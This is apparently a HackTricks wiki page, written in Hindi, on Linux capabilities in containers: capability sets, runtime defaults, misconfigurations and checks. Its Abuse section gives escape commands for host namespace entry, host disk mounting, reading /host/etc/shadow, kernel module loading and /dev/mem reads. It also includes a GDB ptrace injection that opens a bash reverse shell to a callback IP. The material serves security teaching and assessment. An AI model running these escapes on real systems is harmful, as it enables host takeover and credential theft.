# Containers में Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

Linux capabilities container security के सबसे महत्वपूर्ण हिस्सों में से एक हैं, क्योंकि वे एक सूक्ष्म लेकिन मूलभूत प्रश्न का उत्तर देती हैं: **किसी container के अंदर "root" होने का वास्तव में क्या अर्थ है?** सामान्य Linux system पर UID 0 का अर्थ ऐतिहासिक रूप से बहुत व्यापक privilege set होता था। आधुनिक kernels में इस privilege को capabilities नामक छोटी units में विभाजित किया गया है। यदि संबंधित capabilities हटा दी गई हों, तो कोई process root के रूप में चलने के बावजूद कई powerful operations करने में असमर्थ हो सकता है। <sup>[[1]](#references)</sup>

Containers इस अंतर पर काफी निर्भर करते हैं। Compatibility या simplicity के कारण कई workloads को container के अंदर अभी भी UID 0 के रूप में launch किया जाता है। Capability dropping के बिना यह बहुत खतरनाक होता। Capability dropping के साथ, containerized root process अभी भी कई सामान्य in-container tasks कर सकता है, जबकि उसे अधिक sensitive kernel operations से रोका जा सकता है। इसी कारण `uid=0(root)` दिखाने वाला container shell अपने-आप "host root" या "broad kernel privilege" नहीं दर्शाता। Capability sets यह तय करती हैं कि उस root identity का वास्तविक privilege कितना है।

पूरे Linux capability reference और कई abuse examples के लिए देखें:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities को कई sets में track किया जाता है, जिनमें permitted, effective, inheritable, ambient और bounding sets शामिल हैं। कई container assessments के लिए, प्रत्येक set की exact kernel semantics से तुरंत अधिक महत्वपूर्ण practical प्रश्न यह है: **यह process अभी कौन-से privileged operations सफलतापूर्वक कर सकता है, और भविष्य में privilege gains की कौन-सी संभावनाएँ अभी भी मौजूद हैं?** <sup>[[1]](#references)</sup>

यह इसलिए महत्वपूर्ण है क्योंकि कई breakout techniques वास्तव में container problems के रूप में छिपी हुई capability problems होती हैं। `CAP_SYS_ADMIN` वाले workload को kernel functionality की बहुत बड़ी मात्रा तक पहुँच मिल सकती है, जिसे एक सामान्य container root process को access नहीं करना चाहिए। `CAP_NET_ADMIN` वाला workload तब और अधिक dangerous हो जाता है जब वह host network namespace भी share करता हो। `CAP_SYS_PTRACE` वाला workload तब अधिक interesting हो जाता है जब वह host PID sharing के माध्यम से host processes को देख सके। Docker या Podman में यह `--pid=host` के रूप में दिखाई दे सकता है; Kubernetes में यह आमतौर पर `hostPID: true` के रूप में दिखाई देता है।

दूसरे शब्दों में, capability set का मूल्यांकन isolation में नहीं किया जा सकता। इसे namespaces, seccomp और MAC policy के साथ मिलाकर पढ़ना आवश्यक है।

## Lab

Container के अंदर capabilities inspect करने का एक बहुत सीधा तरीका है:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
आप अधिक restrictive container की तुलना उस container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
सीमित जोड़ का प्रभाव देखने के लिए, सब कुछ हटाकर केवल एक capability वापस जोड़ने का प्रयास करें:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
ये छोटे experiments यह दिखाने में मदद करते हैं कि कोई runtime केवल `"privileged"` नामक boolean को toggle नहीं कर रहा है। वह process के लिए उपलब्ध वास्तविक privilege surface को आकार दे रहा है।

## High-Risk Capabilities

Capabilities केवल तभी escape primitives बनती हैं, जब उनका operation **host-governed resource** तक पहुँचता है। बार-बार दिखाई देने वाले high-risk combinations हैं:

- **`CAP_SYS_ADMIN`** के साथ host PID, block device, या writable kernel-control path। किसी target mount namespace में शामिल होने के लिए अतिरिक्त रूप से `CAP_SYS_CHROOT` आवश्यक है; block-based filesystem को mount करने के लिए initial user namespace में `CAP_SYS_ADMIN` आवश्यक है।
- **`CAP_SYS_PTRACE`** के साथ host PID visibility और attach किए जा सकने वाला host process। ptrace injection के लिए `CAP_SYS_ADMIN` आवश्यक नहीं है।
- **`CAP_DAC_OVERRIDE` या `CAP_DAC_READ_SEARCH`** के साथ reachable host filesystem। ये capabilities अलग-अलग DAC checks को bypass करती हैं, लेकिन host filesystem view उपलब्ध नहीं करातीं।
- Initial user namespace में **`CAP_SYS_MODULE`** के साथ accepted, kernel-compatible module। सामान्य Linux containers node kernel को share करते हैं; VM या userspace-kernel runtimes इस boundary को बदल देते हैं।
- Initial user namespace में **`CAP_MKNOD`** के साथ वास्तविक host device, जिसे device cgroup पहले से permit करता हो। Node बनाना device cgroup को bypass नहीं करता।
- **`CAP_SYS_RAWIO`** के साथ exposed और usable memory, I/O-port, PCI, या device-control interface।
- Host reboot के लिए initial PID namespace के साथ **`CAP_SYS_BOOT`**, या kernel replacement के लिए usable और permitted kexec path।
- Direct node network-state control के लिए host network namespace में **`CAP_NET_ADMIN`**। **`CAP_NET_RAW`** protocol-specific escape में भाग ले सकता है, लेकिन केवल raw sockets node shell नहीं होते।

`CAP_SYS_CHROOT` को जानबूझकर standalone escape capability के रूप में सूचीबद्ध नहीं किया गया है। Mount-namespace `setns()` के लिए इसकी आवश्यकता हो सकती है और यह पहले से accessible host tree को उपयोग करना आसान बना सकता है, लेकिन केवल `chroot()` उस tree को expose नहीं करता और न ही नई filesystem permissions प्रदान करता है। इसी तरह, `CAP_BPF` और `CAP_PERFMON` शक्तिशाली telemetry और kernel attack surface expose करते हैं, लेकिन किसी अलग kernel flaw की अनुपस्थिति में इनके सामान्य operations generic container escapes नहीं होते।

## Runtime Usage

Docker, Podman, containerd-based stacks और CRI-O सभी capability controls का उपयोग करते हैं, लेकिन इनके defaults और management interfaces अलग-अलग होते हैं। Docker इन्हें `--cap-drop` और `--cap-add` जैसे flags के माध्यम से सीधे expose करता है। Podman समान controls expose करता है और अतिरिक्त safety layer के रूप में इन्हें अक्सर rootless execution के साथ combine करता है। Kubernetes capability additions और drops को Pod या container `securityContext` के माध्यम से surface करता है; lower-level runtimes resulting sets को OCI runtime configuration में express करते हैं। LXC और Incus जैसे system-container environments भी capability control पर निर्भर करते हैं, लेकिन उनका broader host integration operators को application container की तुलना में defaults को अधिक आक्रामक रूप से relax करने के लिए प्रेरित कर सकता है। <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

इन सभी में यही principle लागू होता है: कोई capability technically grant की जा सकती है, इसका अर्थ यह नहीं है कि उसे grant किया जाना चाहिए। कई real-world incidents तब शुरू होते हैं, जब कोई operator केवल इसलिए capability add कर देता है क्योंकि workload stricter configuration में fail हो गया था और team को quick fix की आवश्यकता थी।

## Misconfigurations

सबसे स्पष्ट गलती Docker/Podman-style CLIs में **`--cap-add=ALL`** है, लेकिन यह अकेली गलती नहीं है। व्यवहार में अधिक सामान्य समस्या एक या दो अत्यंत powerful capabilities, विशेष रूप से `CAP_SYS_ADMIN`, को "application को काम कराने" के लिए grant करना है, बिना namespace, seccomp और mount implications को समझे। एक अन्य सामान्य failure mode extra capabilities को host namespace sharing के साथ combine करना है। Docker या Podman में यह `--pid=host`, `--network=host`, या `--userns=host` के रूप में दिखाई दे सकता है; Kubernetes में equivalent exposure आमतौर पर `hostPID: true` या `hostNetwork: true` जैसी workload settings के माध्यम से दिखाई देता है। इनमें से प्रत्येक combination यह बदलता है कि capability वास्तव में किसे affect कर सकती है।

Administrators को अक्सर यह भी लगता है कि क्योंकि कोई workload पूरी तरह `--privileged` नहीं है, इसलिए वह अभी भी meaningful रूप से constrained है। कभी-कभी यह सही होता है, लेकिन कभी-कभी effective posture पहले ही privileged के इतना करीब होता है कि operational रूप से यह distinction मायने रखना बंद कर देती है।

## Abuse

Effective sets, user-namespace mapping, seccomp state, namespaces, mounts और devices को record करके शुरू करें। इस context के बिना केवल capability name escape का proof नहीं है:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces और block devices

host PID visibility के साथ, `CAP_SYS_ADMIN` host namespaces में प्रवेश कर सकता है। mount-namespace operation के लिए caller के user namespace में `CAP_SYS_CHROOT` भी आवश्यक है।

**capability और confinement जाँचें:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Target की गणना करें:** container/Pod configuration या स्पष्ट host process list से host PID sharing की पुष्टि करें, फिर target namespaces का निरीक्षण करें। निजी PID namespaces में भी एक local PID 1 मौजूद होता है, इसलिए केवल उसकी मौजूदगी host PID sharing को सिद्ध नहीं करती।
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**namespace path का exploit करें:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Capability checks उन user namespaces में सफल होने चाहिए जो targets के स्वामी हैं। `--pid=host` या Kubernetes का `hostPID: true` visibility प्रदान करता है; यह capabilities प्रदान नहीं करता।

Alternative block-device path के लिए, candidates को **enumerate** करें, फिर validated candidate को पहले read-only mount करके accessible filesystem को **exploit** करें:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
डिवाइस node मौजूद होना चाहिए, device cgroup को इसकी अनुमति देनी चाहिए, और block-filesystem mounts के लिए initial user namespace में `CAP_SYS_ADMIN` आवश्यक है। `/host` पर पहले से bind-mounted host root, `CAP_SYS_ADMIN` के बिना ही host access देता है; `chroot /host` केवल सुविधा के लिए है और इसके लिए अलग से `CAP_SYS_CHROOT` आवश्यक है।

### Reachable host root: direct filesystem execution

यदि host root पहले से `/host` पर mounted है, तो पहले mount की पुष्टि करें और फिर मौजूदा access का सीधे उपयोग करें। यह path `CAP_SYS_ADMIN` पर निर्भर नहीं करता:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
यदि `chroot()` उपलब्ध नहीं है, लेकिन host binary container के architecture और loader के साथ compatible है, तो इसे अक्सर mounted tree के माध्यम से इसके बजाय call किया जा सकता है:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
`/host` के अंतर्गत सीधे reads और writes पहले से ही host-filesystem compromise हैं। `chroot()` या किसी host binary को execute करना केवल उस access को अधिक सुविधाजनक बनाता है; इनमें से कोई भी operation host mount create नहीं करता या read-only mount अथवा MAC policy को bypass नहीं करता।

### `CAP_SYS_PTRACE`: host-process injection

Host PID visibility और target के user namespace में `CAP_SYS_PTRACE` के साथ, GDB किसी approved host process से `system()` call करवा सकता है। `CAP_SYS_ADMIN` आवश्यक नहीं है।

**Capability और attachment controls जाँचें:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**एक disposable target को enumerate और select करें:** configuration या स्पष्ट node process list से host PID sharing की पुष्टि करें; कभी भी PID 1 या किसी critical daemon को select न करें।
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**चयनित process का exploit करें:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Target attachable होना चाहिए और उसमें उपयोग करने योग्य `system()` symbol तथा Bash payload path होना चाहिए। Yama, non-dumpable state, seccomp, user namespaces और MAC policy इस chain को block कर सकते हैं। GDB attached होने पर target को रोक देता है, इसलिए केवल disposable lab process का उपयोग करें।

### `CAP_DAC_OVERRIDE` और `CAP_DAC_READ_SEARCH`: protected host files

ये capabilities host filesystem को expose नहीं करतीं। यदि `/host` पहले से ही host mount है, तो `CAP_DAC_READ_SEARCH` read/search DAC checks को bypass कर सकता है और `CAP_DAC_OVERRIDE` इसके अतिरिक्त सामान्य write checks को भी bypass कर सकता है:

**Capabilities check करें:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Exposed host filesystem को enumerate करें और target permissions:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**read और write bypasses का अभ्यास करें** एक disposable lab में:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Read-only mount और LSM rules अभी भी लागू होते हैं। `CAP_DAC_READ_SEARCH` `open_by_handle_at()` को भी authorize करता है, लेकिन Shocker जैसे breakout के लिए उसी underlying filesystem का mount file descriptor, valid या discoverable handles, compatible filesystem/storage layout और किसी runtime या LSM block का न होना भी आवश्यक है। यह mount namespace के बाहर मौजूद हर filesystem तक arbitrary access प्रदान नहीं करता।

### `CAP_SYS_MODULE`: shared-kernel execution

एक सामान्य Linux container में, accepted module shared host kernel में चलता है।

**Capability और user-namespace scope जाँचें:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**मॉड्यूल-लोडिंग की पूर्वापेक्षाओं की सूची बनाएँ:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**केवल एक compatible, pre-reviewed proof module के साथ disposable node पर Exploit करें:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability initial user namespace में effective होनी चाहिए। Kernel version और configuration, module signatures, lockdown, seccomp और LSM policy को load की अनुमति देनी होगी। Kata, gVisor, Hyper-V isolation और इसी तरह के runtimes यह बदल देते हैं कि workload किस kernel boundary तक पहुँचता है।

### `CAP_MKNOD`: permitted device handle बनाना

`CAP_MKNOD` एक device node बनाता है, लेकिन device cgroup को bypass नहीं करता। Device creation namespaced नहीं है, इसलिए capability initial user namespace में effective होनी चाहिए।

**Capability और user-namespace scope जाँचें:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**वास्तविक devices, उनके major/minor numbers और किसी भी दृश्यमान cgroup-v1 allowlist को enumerate करें:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**एक validated ext-family candidate को read-only रूप में exploit करें:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
अन्य filesystems को matching read-only tool की आवश्यकता होती है; device को mount करने के लिए अतिरिक्त रूप से `CAP_SYS_ADMIN` की आवश्यकता होती है। बनाए गए node को खोलते समय `Operation not permitted` आमतौर पर संकेत देता है कि device cgroup अभी भी इसे block कर रहा है। cgroup v2 के अंतर्गत, device access सामान्यतः BPF के साथ लागू किया जाता है और कोई `devices.list` file मौजूद नहीं होती, इसलिए सफल open ही निर्णायक test है।

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

कोई portable generic payload नहीं है: valid addresses और effects hardware तथा kernel configuration पर निर्भर करते हैं।

**Capability और user-namespace scope जाँचें:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**उजागर किए गए raw interfaces, hardware और drivers की सूची बनाएँ:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**पहचाने गए device और address range के लिए approved proof के साथ ही Exploit करें।** यदि `/dev/mem` lab-approved interface है, तो यह template इसकी contents को print किए बिना node-memory disclosure साबित करता है:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
पता lab के hardware map से आना चाहिए, क्योंकि कुछ MMIO regions को पढ़ने पर side effects हो सकते हैं। एक generic memory-write command भ्रामक और असुरक्षित होगा: एक ही address एक मशीन पर harmless हो सकता है, जबकि दूसरी मशीन पर hardware या kernel memory को control कर सकता है। Device cgroups, filesystem permissions, strict `/dev/mem`, kernel lockdown, virtualization और LSM policy आम तौर पर उपयोगी access को रोकते हैं।

### `CAP_SYS_BOOT`: namespace reboot या kernel replacement

एक private PID namespace में, `reboot()` host को reboot करने के बजाय उस namespace की init process को terminate करता है। इसलिए host reboot का प्रभाव पाने के लिए initial PID namespace की आवश्यकता होती है, जो सामान्यतः host PID sharing के माध्यम से मिलती है। kexec path के लिए compatible kernel image और permissive lockdown/signature policy भी आवश्यक होती है:

**Capability जाँचें:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**PID-namespace और kexec prerequisites को सूचीबद्ध करें:** workload configuration से host PID sharing की पुष्टि करें, क्योंकि केवल PID namespace link यह नहीं बताता कि वह node का initial namespace है।
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit तभी करें जब disposable lab node को reboot करना स्पष्ट रूप से exercise का हिस्सा हो:**
```bash
sync
reboot -f
```
उस command को issue न करें और केवल capability को साबित करने के लिए shared node पर kernel load न करें। एक private PID namespace में यह केवल उसी namespace की init process को terminate करता है और host पर प्रभाव प्रदर्शित नहीं करता।

### `CAP_NET_ADMIN` और `CAP_NET_RAW`: host network paths

`CAP_NET_ADMIN` केवल current network namespace को प्रभावित करता है।

**capabilities और confinement की जाँच करें:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**वर्तमान network को enumerate करें और workload configuration से host networking की पुष्टि करें:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**`CAP_NET_ADMIN` का reversible उपयोग:** host networking के साथ, temporary interface एक node interface है।
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` RAW और PACKET sockets की अनुमति देता है, लेकिन यह generic host shell नहीं है। Documented GCE chain को **enumerate** करने के लिए, metadata route जाँचें और capture करें कि plaintext guest-agent traffic observe किया जा सकता है या नहीं:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
यदि matching prerequisites मौजूद हों, तो [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) में documented environment-specific chain को **exploit** करें: request और sequence state capture करें, SSH key वाली forged metadata response inject करें, फिर host access को validate करें। इस chain के लिए root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic और raceable guest-agent request आवश्यक थे; modern transport या agent behavior इसे विफल कर सकता है।

## Checks

Capability checks का लक्ष्य केवल raw values dump करना नहीं है, बल्कि यह समझना है कि क्या process के पास अपनी current namespace और mount situation को dangerous बनाने के लिए पर्याप्त privilege है।
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
यहाँ क्या interesting है:

- `capsh --print` high-risk capabilities जैसे `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, या `cap_sys_module` को पहचानने का सबसे आसान तरीका है।
- `/proc/self/status` में `CapEff` line बताती है कि अभी वास्तव में क्या effective है, न कि केवल यह कि अन्य sets में क्या उपलब्ध हो सकता है।
- यदि container host PID, network, या user namespaces भी share करता है, या उसके पास writable host mounts हैं, तो capability dump और भी महत्वपूर्ण हो जाता है।

Raw capability information collect करने के बाद अगला step interpretation है। जाँचें कि process root है या नहीं, user namespaces active हैं या नहीं, host namespaces shared हैं या नहीं, seccomp enforcing है या नहीं, और क्या AppArmor या SELinux अभी भी process को restrict कर रहे हैं। Capability set अपने-आप में पूरी कहानी नहीं बताता, लेकिन अक्सर यही वह हिस्सा होता है जो समझाता है कि एक container breakout क्यों काम करता है और दूसरे में समान apparent starting point के बावजूद failure क्यों होता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Default रूप से reduced capability set | Docker capabilities की एक default allowlist रखता है और बाकी को drop कर देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Default रूप से reduced capability set | Podman containers default रूप से unprivileged होते हैं और reduced capability model का उपयोग करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | परिवर्तन न होने पर runtime defaults inherit करता है | यदि `securityContext.capabilities` specify नहीं किए गए हैं, तो container को runtime से default capability set मिलता है | `securityContext.capabilities.add`, `drop: [\"ALL\"]` करने में failure, `privileged: true` |
| containerd / CRI-O under Kubernetes | आमतौर पर runtime default | Effective set runtime और Pod spec पर निर्भर करता है | Kubernetes row जैसा ही; direct OCI/CRI configuration भी capabilities को explicitly add कर सकता है |

Kubernetes के लिए महत्वपूर्ण बात यह है कि API कोई एक universal default capability set define नहीं करता। यदि Pod capabilities को add या drop नहीं करता, तो workload उस node के runtime default को inherit करता है।

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
